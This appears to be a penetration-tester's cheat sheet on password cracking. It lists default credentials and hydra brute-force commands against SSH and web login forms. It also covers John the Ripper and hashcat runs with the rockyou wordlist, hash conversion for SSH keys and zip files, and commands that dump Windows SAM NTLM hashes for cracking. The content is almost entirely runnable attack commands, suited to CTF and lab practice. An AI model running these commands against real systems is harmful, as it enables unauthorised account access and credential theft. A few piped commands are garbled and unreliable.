# Password Cracking

## Default Credentials

    admin:admin admin:password root:root root:toor

## Password Attacks

Try same user, reverse user and null as password against a login for a quick check

    hydra -l USER -e nsr IP ssh -V

Burpsuite Intruder if we want to

    john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt

    sudo gzip -d rockyou.txt.gz

    hydra -l noman -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.10.10

    hydra -l noman -P /usr/share/wordlists/rockyou.txt 192.168.10.10 http-post

    hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.10.10 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"

    hashcat -b | hashcat.exe -b (linux and window benchmark)

customize wordlists

    head /usr/share/wordlists/rockyou.txt > demo.txt | sed -i '/^1/d' demo.txt

if we want to add 1 in all password then | 

    echo \$1 > demo.rule | hashcat -r demo.rule --stdout demo.txt

    hash-identifier (find hash if simple)

    hashid (if id is available "$2y$10$)

    ssh2john id_rsa > ssh.hash | hashcat -h | grep -i "ssh" (port22)

## Zip Cracking

    fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' chall.zip

    zip2john file.zip > zip.john
    john zip.john

## NTLM Crack

    token::elevate (check user permission) | lsadump::sam (dump all user ntlm)

Then

    hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
